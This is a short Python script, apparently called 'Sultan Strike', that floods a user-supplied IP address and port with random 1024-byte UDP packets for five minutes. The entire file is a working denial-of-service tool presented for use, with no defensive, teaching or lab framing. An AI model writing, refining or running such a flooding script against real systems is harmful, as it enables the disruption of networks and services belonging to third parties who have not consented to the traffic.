import sys
import socket
import time
import random

if len(sys.argv) < 3:
    print("Usage: python3 attack.py IP PORT")
    sys.exit()

target_ip = sys.argv[1]
target_port = int(sys.argv[2])
duration = 300 # 5 Minute attack

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = random._urandom(1024)
timeout = time.time() + duration

print(f"Sultan Strike Started on {target_ip}:{target_port}")

while time.time() < timeout:
    client.sendto(payload, (target_ip, target_port))
  
